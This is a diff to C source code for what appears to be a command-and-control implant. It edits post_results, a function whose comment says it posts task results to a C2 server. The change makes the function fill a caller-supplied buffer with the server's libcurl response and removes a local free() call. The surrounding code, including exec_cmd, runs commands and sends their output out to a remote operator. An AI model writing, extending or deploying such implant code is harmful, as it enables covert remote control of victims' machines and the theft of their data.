@@ -326,9 +326,12 @@ bool exec_cmd(struct tasks *task)
 }
 
 // Posts task results to C2 server.
-bool post_results(struct tasks *task)
+bool post_results(struct tasks *task, struct strings_array *sa)
 {
-	struct strings_array chunk = {.response = malloc(0), .size = 0};
+	// struct strings_array chunk = {.response = malloc(0), .size = 0};
+	sa->response = malloc(0);
+	sa->size = 0;
+
 	struct web_comms web = {NULL, 0, NULL};
 
 	if (!curl_prep(&web))
@@ -354,12 +357,12 @@ bool post_results(struct tasks *task)
 	curl_easy_setopt(web.curl, CURLOPT_WRITEFUNCTION, mem_cb);
 
 	// Pass chunk to callback function.
-	curl_easy_setopt(web.curl, CURLOPT_WRITEDATA, (void *)&chunk);
+	curl_easy_setopt(web.curl, CURLOPT_WRITEDATA, (void *)sa);
 
 	// Perform the request, res will get the return code
 	web.res = curl_easy_perform(web.curl);
 
-	printf("The data returning from post results is %s\n\n", chunk.response);
+	printf("The data returning from post results is %s\n\n", sa->response);
 
 	// Check for errors
 	if (web.res != CURLE_OK)
@@ -371,8 +374,6 @@ bool post_results(struct tasks *task)
 	// Always cleanup.
 	curl_easy_cleanup(web.curl);
 	
-	free(chunk.response);
-
 	// Then cleanup the form.
 	curl_mime_free(web.form);
 
